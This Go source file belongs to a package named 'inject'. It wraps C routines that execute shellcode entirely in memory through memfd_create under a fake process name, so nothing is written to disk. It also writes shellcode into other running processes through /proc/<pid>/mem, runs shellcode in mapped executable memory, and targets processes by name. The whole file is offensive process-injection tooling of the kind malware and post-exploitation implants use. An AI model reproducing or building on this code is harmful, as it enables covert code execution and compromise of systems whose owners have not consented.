//go:build linux

// Package inject provides process injection capabilities via CGO.
// On Linux: memfd_create, /proc/pid/mem write, ptrace injection.
// On Windows: VirtualAllocEx + CreateRemoteThread (see inject_windows.go).
package inject

/*
#cgo CFLAGS: -O2 -fstack-protector-strong
#include "inject_linux.c"
#include <stdlib.h>
*/
import "C"
import (
	"fmt"
	"unsafe"
)

// MemfdExec executes shellcode entirely in-memory using memfd_create + fexecve.
// The shellcode is never written to disk. After calling this function, the
// current process is replaced by the shellcode's execution context.
// Returns an error only if setup fails (exec itself does not return on success).
func MemfdExec(shellcode []byte, fakeName string) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("inject: empty shellcode")
	}
	name := C.CString(fakeName)
	defer C.free(unsafe.Pointer(name))

	cShellcode := C.CBytes(shellcode)
	defer C.free(cShellcode)

	rc := C.aegis_memfd_exec(
		(*C.uchar)(cShellcode),
		C.size_t(len(shellcode)),
		name,
	)
	if rc != 0 {
		return fmt.Errorf("inject: memfd_exec failed")
	}
	return nil // only reached if exec failed silently
}

// InjectProcess injects shellcode into a running process via /proc/<pid>/mem.
// Requires CAP_SYS_PTRACE or being root.
func InjectProcess(pid int, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("inject: empty shellcode")
	}
	cShellcode := C.CBytes(shellcode)
	defer C.free(cShellcode)

	rc := C.aegis_proc_mem_inject(
		C.pid_t(pid),
		(*C.uchar)(cShellcode),
		C.size_t(len(shellcode)),
	)
	if rc != 0 {
		return fmt.Errorf("inject: proc_mem_inject failed (pid=%d)", pid)
	}
	return nil
}

// RunShellcode allocates executable memory and runs shellcode in the current process.
// Blocks until the shellcode returns (use a goroutine if async is needed).
func RunShellcode(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("inject: empty shellcode")
	}
	cShellcode := C.CBytes(shellcode)
	defer C.free(cShellcode)

	mem := C.aegis_shellcode_alloc((*C.uchar)(cShellcode), C.size_t(len(shellcode)))
	if mem == nil {
		return fmt.Errorf("inject: mmap failed")
	}
	defer C.aegis_shellcode_free(mem, C.size_t(len(shellcode)))

	// Call the shellcode as a function pointer
	fn := *(*func())(unsafe.Pointer(&mem))
	fn()
	return nil
}

// FindPID finds the PID of a running process by its command name.
// Returns -1 if not found.
func FindPID(name string) int {
	cName := C.CString(name)
	defer C.free(unsafe.Pointer(cName))
	return int(C.aegis_find_pid_by_name(cName))
}

// InjectByName injects shellcode into the first process matching name.
func InjectByName(name string, shellcode []byte) error {
	pid := FindPID(name)
	if pid < 0 {
		return fmt.Errorf("inject: process %q not found", name)
	}
	return InjectProcess(pid, shellcode)
}
